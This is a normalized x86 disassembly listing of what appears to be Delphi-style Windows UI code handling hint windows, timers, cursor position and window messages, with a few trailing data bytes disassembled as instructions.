mov eax [ esi + 0xf4 ]
call [ esi + 0xf0 ]
mov ebx eax
lea eax [ esp + 0x8 ]
push eax
mov ecx [ esp + 0x8 ]
mov dx [ esp + 0x4 ]
mov eax [ edi + 0x2ac ]
call [ edi + 0x2a8 ]
mov ebx eax
jmp r-xdata
cmp [ esp + 0x8 ] 0x0
je r-xdata
test [ edi + 0x1c ] 0x10
je r-xdata
mov eax ebx
add esp 0xc
pop ebp
pop edi
pop esi
pop ebx
retn
test bl bl
jne r-xdata
mov eax edi
call sub_44d1f0
cmp ax 0xffff
jne r-xdata
mov [ esp + 0x8 ] 0x0
test edi edi
je r-xdata
cmp [ edi + 0x57 ] 0x0
jne r-xdata
cmp [ esi + 0x50 ] 0x0
je r-xdata
mov eax edi
call sub_44d358
test al al
je r-xdata
cmp [ edi + 0x220 ] 0x0
jne r-xdata
cmp [ esi + 0xa4 ] 0x0
jne r-xdata
mov ebp [ esi + 0x30 ]
mov eax [ esi + 0x44 ]
test eax eax
je r-xdata
cmp [ edi + 0x23c ] 0x0
je r-xdata
mov [ esp + 0x8 ] 0x0
mov eax [ esp + 0x4 ]
push eax
movzx eax [ esp + 0x4 ]
push eax
push 0xb01f
mov eax [ esi + 0x30 ]
push eax
call PostMessageA
mov eax esi
call sub_46791c
test al al
je r-xdata
call sub_44d054
mov ebp eax
mov eax edi
call sub_44d054
mov ebp eax
mov eax esi
call sub_46791c
test al al
je r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ esi + 0x50 ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
mov ax [ esp ]
push eax
mov eax [ esp + 0x8 ]
push eax
mov ecx [ edi + 0x23c ]
mov edx ebp
mov eax [ esi + 0x4c ]
mov ebx [ eax ]
call [ ebx + 0x20 ]
mov ebx eax
jmp r-xdata
sub_4673e0
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_467438
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46791c
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_468168
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0xc ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_46743f
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_467448
push ebp
mov ebp esp
push 0x0
push ebx
push esi
push edi
mov edi edx
mov esi eax
xor eax eax
push ebp
push sub_4674a0
push [ fs : eax ]
mov [ fs : eax ] esp
mov bl 0x1
mov eax esi
call sub_46791c
test al al
je r-xdata
xor ebx ebx
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_468168
mov ecx [ ebp - 0x4 ]
mov edx edi
mov eax [ esi + 0x4c ]
mov esi [ eax ]
call [ esi + 0x10 ]
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4674a7
lea eax [ ebp - 0x4 ]
call sub_403fe8
retn
sub_4674b8
push ebx
push esi
mov ebx eax
cmp dl [ ebx + 0x88 ]
je r-xdata
pop esi
pop ebx
retn
mov eax edx
mov [ ebx + 0x88 ] al
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_403270
xor eax eax
mov [ ebx + 0x84 ] eax
mov ecx ebx
mov dl 0x1
mov eax [ rw-data ]
call [ eax + 0x2c ]
mov esi eax
mov [ ebx + 0x84 ] esi
mov edx [ ebx + 0x5c ]
mov eax esi
call sub_446904
jmp r-xdata
sub_467508
push ebx
push esi
push edi
mov eax [ rw-data ]
call sub_464ab4
mov esi eax
dec esi
test esi esi
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
mov eax ebx
call sub_44d054
push eax
call IsWindowVisible
test eax eax
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_464aa0
mov ebx eax
mov eax ebx
call sub_44d358
test al al
je r-xdata
mov eax ebx
call sub_44d054
push eax
call IsWindowEnabled
test eax eax
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xdc ]
sub_46756c
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
push esp
call GetCursorPos
mov eax esp
mov dl 0x1
call sub_445010
mov edi eax
call sub_44390c
mov esi eax
cmp edi [ ebx + 0x48 ]
je r-xdata
mov eax edi
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
cmp [ ebx + 0x48 ] 0x0
je r-xdata
test esi esi
je r-xdata
test esi esi
je r-xdata
mov [ ebx + 0x48 ] edi
cmp [ ebx + 0x48 ] 0x0
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb014
mov eax [ ebx + 0x48 ]
call sub_44790c
test esi esi
je r-xdata
test esi esi
je r-xdata
cmp esi [ ebx + 0x48 ]
jne r-xdata
push 0x0
xor ecx ecx
mov edx 0xb013
mov eax [ ebx + 0x48 ]
call sub_44790c
sub_4675e4
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0xc ] ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4676f4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_46756c
mov ebx eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_46561c
mov eax [ ebp - 0x10 ]
lea edx [ ebp - 0xc ]
call sub_4438c8
mov edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_4677a4
mov [ ebp - 0x5 ] 0x1
xor eax eax
push ebp
push j_sub_403738#4
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x102 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x48 ] 0x0
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
lea ecx [ ebp - 0x5 ]
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x104 ]
call [ ebx + 0x100 ]
mov eax [ ebp - 0x4 ]
call sub_467b3c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_467508
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
jne r-xdata
cmp [ ebp - 0x5 ] 0x0
je r-xdata
xor eax eax
call sub_4206cc
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4676fb
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_40400c
retn
call WaitMessage
mov [ ebp - 0x5 ] 0x0
sub_467704
push ebx
push esi
push edi
mov edi edx
mov eax [ rw-data ]
call sub_464a98
mov ebx eax
dec ebx
test ebx ebx
jl r-xdata
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
push 0x0
mov edx esi
mov eax [ rw-data ]
call sub_464a84
movzx edx di
xor ecx ecx
call sub_44790c
inc esi
dec ebx
jne r-xdata
sub_467740
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax [ ebx + 0x30 ]
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_46685c
push eax
push 0x1
push 0x80
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
mov eax ebx
call sub_46685c
push eax
push 0xfffffff2
mov eax [ ebx + 0x30 ]
push eax
call SetClassLongA
jmp r-xdata
mov dx 0xb01d
mov eax ebx
call sub_467704
pop ebx
retn
push 0xffffffff
push 0x0
mov eax [ ebx + 0x30 ]
push eax
call InvalidateRect
sub_4677a4
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x54 ]
mov edx esi
call sub_4043f4
je r-xdata
pop esi
pop ebx
pop ecx
pop ebp
retn
lea eax [ ebx + 0x54 ]
mov edx esi
call sub_40403c
cmp [ ebx + 0xfa ] 0x0
je r-xdata
mov ecx ebx
mov dl 0x1
mov eax [ r-xdata ]
call sub_440690
mov [ ebp - 0x4 ] eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_4532f4
xor eax eax
push ebp
push sub_467829
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov si 0xffef
call sub_40346c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
call sub_403270
retn
mov edx ebx
mov eax [ ebx + 0xfc ]
call [ ebx + 0xf8 ]
jmp r-xdata
sub_467838
push ebp
mov ebp esp
push ebx
mov ebx eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call IsWindowVisible
cmp eax 0x1
sbb eax eax
inc eax
cmp al [ rw-data ]
jne r-xdata
pop ebx
pop ebp
retn
cmp bl [ rw-data ]
je r-xdata
xor eax eax
mov al bl
movzx eax [ eax * 2 + rw-data ]
push eax
push 0x0
push 0x0
push 0x0
push 0x0
push 0x0
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x30 ]
push eax
call SetWindowPos
mov [ rw-data ] bl
sub_467894
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x30 ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov eax [ rw-data ]
call sub_464a98
mov esi eax
dec esi
test esi esi
jl r-xdata
push ebp
xor eax eax
call sub_467838
pop ecx
inc esi
xor edi edi
inc edi
dec esi
jne r-xdata
cmp [ ebx + 0x190 ] 0x0
je r-xdata
mov edx edi
mov eax [ rw-data ]
call sub_464a84
mov ebx eax
cmp [ ebx + 0x57 ] 0x0
je r-xdata
push ebp
mov al 0x1
call sub_467838
pop ecx
jmp r-xdata
mov eax ebx
call sub_44d358
test al al
jne r-xdata
mov eax [ ebx + 0x190 ]
push eax
mov eax ebx
call sub_44d054
push eax
call IsChild
test eax eax
jne r-xdata
sub_46791c
push ebx
push esi
mov esi eax
xor ebx ebx
cmp [ esi + 0x4c ] 0x0
jne r-xdata
cmp [ esi + 0x4c ] 0x0
je r-xdata
lea eax [ esi + 0x4c ]
call sub_4058a8
call sub_42a6c0
mov eax ebx
pop esi
pop ebx
retn
mov bl 0x1
sub_467944
push ebx
push esi
push edi
mov ebx ecx
mov esi edx
mov edi eax
mov eax edi
call sub_467988
push sub_465674
push esi
push 0x0
push 0x0
call SetTimer
mov [ edi + 0x8a ] ax
mov [ edi + 0x89 ] bl
cmp [ edi + 0x8a ] 0x0
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov eax edi
call sub_467b3c
sub_4679b0
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov ebp ecx
mov edi edx
mov esi eax
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406bf8
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_44627c
lea eax [ esp + 0x10 ]
mov dl 0x1
call sub_445010
call sub_465654
mov ebx eax
test ebx ebx
je r-xdata
mov eax esi
call sub_467b3c
jmp r-xdata
cmp [ ebx + 0x99 ] 0x0
jne r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
cmp ebx [ esi + 0x60 ]
jne r-xdata
mov al [ esi + 0x58 ]
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
je r-xdata
lea edx [ esp + 0x18 ]
mov eax [ ebp + 0x8 ]
call sub_406bf8
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax edi
call sub_44627c
push [ esp + 0x14 ]
push [ esp + 0x14 ]
lea eax [ esi + 0x64 ]
push eax
call PtInRect
test eax eax
jne r-xdata
mov eax [ esi + 0x78 ]
mov [ esp ] eax
mov eax [ esi + 0x80 ]
mov [ esp ] eax
jmp r-xdata
mov eax esi
call sub_467b3c
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
xor ecx ecx
mov edx [ esp ]
mov eax esi
call sub_467944
cmp [ esp ] 0x0
jne r-xdata
mov eax esp
push eax
xor ecx ecx
mov cl [ esp + 0x8 ]
mov edx 0xb041
mov eax ebx
call sub_44790c
cmp [ esp + 0x4 ] 0x0
je r-xdata
mov al [ esp + 0x4 ]
mov [ esi + 0x58 ] al
mov [ esi + 0x60 ] ebx
lea eax [ esp + 0x5 ]
push eax
call GetCursorPos
lea edx [ esp + 0x5 ]
mov eax esi
call sub_467dd4
jmp r-xdata
sub_467ac0
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
call sub_467988
mov al [ ebx + 0x89 ]
sub al 0x1
jb r-xdata
push esp
call GetCursorPos
mov edx esp
mov eax ebx
call sub_467dd4
jne r-xdata
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_467af8
jmp r-xdata
sub_467af8
push ebx
push esi
mov ebx eax
mov esi [ ebx + 0x84 ]
test esi esi
je r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_44d358
test al al
je r-xdata
mov eax [ ebx + 0x84 ]
call sub_44d054
push eax
call IsWindowVisible
test eax eax
je r-xdata
push 0x0
mov eax [ ebx + 0x84 ]
call sub_44d054
push eax
call ShowWindow
sub_467b3c
push ebx
mov ebx eax
cmp [ ebx + 0x60 ] 0x0
je r-xdata
pop ebx
retn
mov eax ebx
call sub_467af8
xor eax eax
mov [ ebx + 0x60 ] eax
mov [ ebx + 0x58 ] 0x0
call sub_4657dc
mov eax ebx
call sub_467988
sub_467b74
push ebp
mov ebp esp
add esp 0xffffffd8
push ebx
push esi
push edi
push 0xe
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x28 ]
push eax
call GetCursor
push eax
call GetIconInfo
test eax eax
je r-xdata
mov eax [ ebp - 0x4 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
xor edx edx
push ebp
push sub_467cb6
push [ fs : edx ]
mov [ fs : edx ] esp
lea ecx [ ebp - 0xc ]
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
call sub_425d9c
mov eax [ ebp - 0x8 ]
add eax [ ebp - 0xc ]
call sub_407d40
mov [ ebp - 0x10 ] eax
xor edx edx
push ebp
push sub_467c87
push [ fs : edx ]
mov [ fs : edx ] esp
mov ebx [ ebp - 0x10 ]
add ebx [ ebp - 0x8 ]
push ebx
mov esi [ ebp - 0x10 ]
mov ecx esi
xor edx edx
mov eax [ ebp - 0x1c ]
call sub_425e54
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467c8e
mov edx [ ebp - 0x8 ]
add edx [ ebp - 0xc ]
mov eax [ ebp - 0x10 ]
call sub_402714
retn
mov eax [ ebp - 0x10 ]
cmp [ eax + 0xe ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov edx eax
movzx ecx [ esi + 0xe ]
imul edx ecx
add edx 0x1f
and edx 0xffffffe0
test edx edx
jns r-xdata
sar edx 0x3
mov [ ebp - 0x14 ] edx
mov edi eax
imul edi [ ebp - 0x14 ]
add ebx [ ebp - 0xc ]
sub ebx edi
mov ecx 0xff
mov edx edi
mov eax ebx
call sub_467b64
mov [ ebp - 0x4 ] eax
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
add edx 0x7
mov eax [ ebp - 0x4 ]
cdq
idiv [ ebp - 0x14 ]
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x20 ]
sub [ ebp - 0x4 ] eax
mov eax [ esi + 0x8 ]
mov edx [ esi + 0x4 ]
add edx edx
cmp eax edx
jl r-xdata
mov eax ebx
sub eax edi
xor ecx ecx
mov edx edi
call sub_467b64
mov [ ebp - 0x4 ] eax
sub_467c8e
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x18 ]
test eax eax
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push eax
call DeleteObject
retn
push eax
call DeleteObject
sub_467cc8
push ebp
mov ebp esp
push ebx
push esi
mov ebx eax
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov esi [ eax + 0x84 ]
test esi esi
je r-xdata
mov ebx [ rw-data ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
call sub_403270
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x4 ]
mov dl 0x1
mov eax ebx
call [ eax + 0x2c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
mov [ edx + 0x84 ] eax
mov eax [ ebp + 0x8 ]
mov eax esi
call sub_4031b8
cmp ebx eax
je r-xdata
pop esi
pop ebx
pop ebp
retn
sub_467d28
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor edx edx
mov [ ebp - 0x8 ] edx
xor edx edx
push ebp
push sub_467dc2
push [ fs : edx ]
mov [ fs : edx ] esp
xor edx edx
mov [ ebp - 0x4 ] edx
mov ebx eax
test ebx ebx
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_467dc9
lea eax [ ebp - 0x8 ]
call sub_403fe8
retn
jmp r-xdata
cmp [ ebx ] 0x0
jne r-xdata
mov esi ebx
jmp r-xdata
mov al [ ebx ]
test al al
je r-xdata
mov ecx ebx
sub ecx esi
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_4040d8
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x84 ]
mov eax [ eax + 0x208 ]
mov edx [ ebp - 0x8 ]
call sub_424980
cmp eax [ ebp - 0x4 ]
jle r-xdata
sub al 0xa
je r-xdata
cmp [ ebx ] 0xd
jne r-xdata
mov [ ebp - 0x4 ] eax
sub al 0x3
jne r-xdata
cmp [ ebx ] 0xa
jne r-xdata
inc ebx
mov eax ebx
call sub_40c294
mov ebx eax
inc ebx
sub_467dd4
push ebp
mov ebp esp
add esp 0xffffff70
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8c ] ecx
mov [ ebp - 0x90 ] ecx
mov esi edx
lea edi [ ebp - 0xc ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404954
lea ebx [ ebp - 0x4 ]
xor eax eax
push ebp
push sub_46815a
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx ]
mov [ eax + 0x58 ] 0x0
mov eax [ ebx ]
cmp [ eax + 0x88 ] 0x0
je r-xdata
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
je r-xdata
mov eax [ ebx ]
call sub_467b3c
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_467944
jmp r-xdata
call sub_45df14
test al al
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468161
lea eax [ ebp - 0x90 ]
mov edx 0x2
call sub_40400c
lea eax [ ebp - 0x60 ]
mov edx [ r-xdata ]
call sub_404a18
retn
lea eax [ ebp - 0xc ]
mov dl 0x1
call sub_445010
call sub_465654
mov edx [ ebx ]
cmp eax [ edx + 0x60 ]
jne r-xdata
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov [ ebp - 0x60 ] eax
mov eax [ ebp - 0xc ]
mov [ ebp - 0x58 ] eax
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x54 ] eax
call sub_467b74
add [ ebp - 0x54 ] eax
mov eax [ rw-data ]
call sub_464a18
mov [ ebp - 0x50 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x5c ]
mov [ ebp - 0x4c ] eax
lea edx [ ebp - 0x80 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_446104
lea esi [ ebp - 0x80 ]
lea edi [ ebp - 0x48 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
lea edx [ ebp - 0x14 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov ecx [ eax ]
call [ ecx + 0x40 ]
xor eax eax
mov [ ebp - 0x1c ] eax
xor eax eax
mov [ ebp - 0x18 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov esi [ eax + 0x30 ]
test esi esi
je r-xdata
mov eax [ ebx ]
mov esi [ eax + 0x60 ]
mov eax esi
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
jmp r-xdata
mov eax [ ebp - 0x18 ]
sub eax [ ebp - 0x10 ]
push eax
mov eax [ ebp - 0x1c ]
sub eax [ ebp - 0x14 ]
push eax
lea eax [ ebp - 0x48 ]
push eax
call OffsetRect
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0xc ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_4462a8
mov eax [ ebp - 0x88 ]
mov [ ebp - 0x38 ] eax
mov eax [ ebp - 0x84 ]
mov [ ebp - 0x34 ] eax
lea edx [ ebp - 0x90 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_46561c
mov eax [ ebp - 0x90 ]
lea edx [ ebp - 0x8c ]
call sub_443884
mov edx [ ebp - 0x8c ]
lea eax [ ebp - 0x28 ]
call sub_404080
xor eax eax
mov [ ebp - 0x30 ] eax
mov eax [ ebx ]
mov eax [ eax + 0x74 ]
mov [ ebp - 0x2c ] eax
mov eax [ rw-data ]
mov [ ebp - 0x5c ] eax
xor eax eax
mov [ ebp - 0x24 ] eax
lea eax [ ebp - 0x60 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
xor ecx ecx
mov edx 0xb030
call sub_44790c
test eax eax
sete [ ebp - 0x1d ]
cmp [ ebp - 0x1d ] 0x0
je r-xdata
cmp [ esi + 0x190 ] 0x0
je r-xdata
cmp [ ebp - 0x1d ] 0x0
je r-xdata
mov eax [ ebx ]
cmp [ eax + 0x132 ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
mov eax [ esi + 0x190 ]
push eax
call ClientToScreen
xor eax eax
jmp r-xdata
mov eax [ ebx ]
cmp [ eax + 0x60 ] 0x0
jne r-xdata
lea eax [ ebp - 0x60 ]
push eax
lea ecx [ ebp - 0x1d ]
lea edx [ ebp - 0x28 ]
mov esi [ ebx ]
mov eax [ esi + 0x134 ]
call [ esi + 0x130 ]
mov edx [ ebx ]
mov [ edx + 0x58 ] al
mov eax [ ebx ]
cmp [ eax + 0x58 ] 0x0
je r-xdata
mov al 0x1
cmp [ ebp - 0x28 ] 0x0
je r-xdata
push ebp
mov eax [ ebp - 0x5c ]
call sub_467cc8
pop ecx
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
mov dl [ eax + 0x5f ]
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax [ ebp - 0x24 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
mov edx [ ebp - 0x50 ]
mov esi [ eax ]
call [ esi + 0xd8 ]
mov eax [ ebp - 0x54 ]
push eax
mov eax [ ebp - 0x58 ]
push eax
lea eax [ ebp - 0x70 ]
push eax
call OffsetRect
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov si 0xffc8
call sub_40346c
test al al
je r-xdata
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x48 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44627c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x64 ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x68 ] edx
lea ecx [ ebp - 0x88 ]
lea edx [ ebp - 0x40 ]
mov eax [ ebx ]
mov eax [ eax + 0x60 ]
call sub_44627c
mov eax [ ebx ]
mov edx [ ebp - 0x88 ]
mov [ eax + 0x6c ] edx
mov edx [ ebp - 0x84 ]
mov [ eax + 0x70 ] edx
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov edx [ ebp - 0x4c ]
call sub_446904
mov eax [ ebp - 0x24 ]
push eax
mov eax [ ebx ]
mov eax [ eax + 0x84 ]
mov ecx [ ebp - 0x28 ]
lea edx [ ebp - 0x70 ]
mov esi [ eax ]
call [ esi + 0xd4 ]
call sub_465768
mov eax [ ebp - 0x30 ]
test eax eax
jle r-xdata
push ebp
mov eax [ ebp - 0x28 ]
call sub_467d28
pop ecx
add eax 0x5
sub [ ebp - 0x70 ] eax
sub [ ebp - 0x68 ] eax
mov cl 0x1
mov edx [ ebp - 0x2c ]
mov eax [ ebx ]
call sub_467944
jmp r-xdata
xor ecx ecx
mov edx eax
mov eax [ ebx ]
call sub_467944
jmp r-xdata
sub_468168
push ebx
push esi
push edi
mov edi edx
mov esi eax
mov eax [ rw-data ]
mov ebx [ eax + 0x68 ]
test ebx ebx
je r-xdata
mov eax edi
mov edx [ esi + 0x50 ]
call sub_40403c
cmp [ ebx + 0x23c ] 0x0
je r-xdata
mov eax edi
mov edx [ ebx + 0x23c ]
call sub_40403c
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_4681c8
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0xa4 ] 0x0
jne r-xdata
mov [ ebx + 0xb0 ] esi
pop esi
pop ebx
retn
push esi
push 0x0
push 0xb031
mov eax [ ebx + 0x30 ]
push eax
call SendMessageA
sub_4681f4
push ebx
push esi
push edi
push ebp
add esp 0xfffffff8
mov ebx ecx
mov [ esp ] edx
mov esi eax
mov eax [ rw-data ]
mov edi [ eax + 0x6c ]
test edi edi
je r-xdata
mov ebp [ esi + 0x44 ]
cmp edi ebp
je r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax edi
call sub_44790c
dec eax
je r-xdata
xor eax eax
jmp r-xdata
test ebp ebp
je r-xdata
mov al 0x1
mov [ esp + 0x4 ] al
cmp [ esp + 0x4 ] 0x0
jne r-xdata
push ebx
xor ecx ecx
mov edx [ esp + 0x4 ]
mov eax ebp
call sub_44790c
dec eax
je r-xdata
mov al [ esp + 0x4 ]
pop ecx
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
mov edx [ r-xdata ]
call sub_4033fc
test al al
je r-xdata
cmp [ ebx + 0x6a ] 0x0
je r-xdata
cmp [ ebx + 0x60 ] 0x0
je r-xdata
cmp [ ebx + 0x42 ] 0x0
setne dl
mov eax ebx
call sub_4531bc
sub_468284
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xc2 ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xc4 ]
call [ ebx + 0xc0 ]
sub_4682ac
push ebx
push ecx
mov [ esp ] 0x0
cmp [ eax + 0xca ] 0x0
je r-xdata
mov al [ esp ]
pop edx
pop ebx
retn
mov ecx esp
mov ebx eax
mov eax [ ebx + 0xcc ]
call [ ebx + 0xc8 ]
sub_468350
add [ eax ] eax
add [ eax ] al
cld
cmp eax 0x31a40047
inc esp
add [ eax ] al
add [ eax ] al
add [ ebp - 0x75 ] dl
in al dx
xor eax eax
push ebp
push sub_4683b3
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4683ba
retn
cmp [ rw-data ] 0x0
je r-xdata
cmp [ rw-data ] 0x0
je r-xdata
call sub_45dcc0
mov eax sub_45df40
call sub_417ef8
mov eax [ rw-data ]
push eax
call CloseHandle
sub_468428
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_46844d
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_468454
retn
sub_46875a
inc esp
add al al
nop
inc esp
add [ edi + edx * 4 + 0x44 ] dl
add ah dh
movsb [ edi ] [ esi ]
inc esp
add al ah
sahf
inc esp
add ah bl
mov eax [ 0xffffffffa00c0044 ]
inc esp
add [ ebp - 0x5a6fffbc ] cl
inc esp
add [ eax - 0x5c ] cl
inc esp
add al dh
mov [ 0xffffffffd0680044 ] eax
inc esp
add [ ebp + ebp * 8 - 0x1da3ffbc ] al
inc esp
add ah ah
int3
sub_4688e3
mov eax 0x5400445a
pop ebx
inc esp
add [ eax ] al
add [ eax ] al
add [ ebx ] 0x0
add [ eax ] al
sldt [ edi ]
inc ecx
outsb
arpl [ eax + 0x6f ] bp
jb r-xdata
add bh bh
sub al 0x8c
inc esp
add [ ecx ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] 0x0
add [ eax + 0x430b0013 ] al
outsd
add [ eax ] dl
inc eax
add [ ebx + eax ] bl
add bh bh
